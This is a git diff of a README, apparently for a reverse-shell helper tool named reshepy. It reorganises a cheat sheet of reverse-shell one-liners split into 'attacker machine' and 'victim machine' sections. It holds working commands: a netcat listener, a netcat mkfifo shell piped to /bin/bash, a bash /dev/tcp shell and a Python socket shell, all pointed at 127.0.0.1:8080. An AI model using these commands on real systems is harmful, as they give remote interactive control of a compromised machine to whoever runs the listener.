@@ -9,22 +9,19 @@ pip3 install setuptools --upgrade
 pip3 install https://github.com/umaumax/reshepy/archive/master.tar.gz
 ```
 
+```
+# mac
+brew install socat
+# ubuntu
+sudo apt-get install -y socat
+```
+
 ----
 
-## darwin
-* [macos \- Create reverse shell using High Sierra? \- Ask Different]( https://apple.stackexchange.com/questions/324824/create-reverse-shell-using-high-sierra )
-
-### attacker machine
-```
-nc -nvl 8080
-```
-
-### victim machine
-```
-mkfifo myfifo
-nc 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1
-rm -f myfifo
-```
+<!-- ## darwin -->
+<!-- * [macos \- Create reverse shell using High Sierra? \- Ask Different]( https://apple.stackexchange.com/questions/324824/create-reverse-shell-using-high-sierra ) -->
+<!-- ### attacker machine -->
+<!-- ### victim machine -->
 
 ## ubuntu
 ### attacker machine
@@ -41,11 +38,19 @@ socat tcp-listen:8080,reuseaddr,fork stdout
 bash -i >& /dev/tcp/localhost/8080 0>&1
 ```
 
-## common
+## common (mac, ubuntu)
 ### attacker machine
-WIP
+```
+nc -nvl 8080
+```
 
 ### victim machine
+```
+mkfifo myfifo
+nc 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1
+rm -f myfifo
+```
+
 ```
 python -c 'import sys,socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],int(sys.argv[2])));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' 127.0.0.1 8080
 ```
